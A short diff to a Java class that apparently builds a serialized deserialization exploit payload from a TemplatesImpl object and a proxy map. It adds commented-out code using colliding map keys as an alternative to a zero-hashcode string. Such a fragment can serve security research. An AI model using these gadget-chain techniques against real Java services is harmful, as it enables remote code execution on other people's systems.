@@ -72,6 +72,19 @@ public class QUEY {
 
         innerMap.put("f5a5a608", obj); // 放入最终的 TemplatesImpl 对象, 这里 put 会覆盖掉原来的 value
 
+      //使用下面的就不用hashcode为0的字符串
+      
+      //Map map1 = new HashMap();
+      //Map map2 = new HashMap();
+      //map1.put("yy",proxyMap);
+      //map1.put("zZ",templatesImpl);
+      //map2.put("yy",templatesImpl);
+      //map2.put("zZ",proxyMap);
+
+      //Map map = new HashMap();
+      //map.put(map1, 1);
+      //map.put(map2, 2);
+
         ByteArrayOutputStream barr = new ByteArrayOutputStream();
         ObjectOutputStream oos = new ObjectOutputStream(barr);
         oos.writeObject(set);
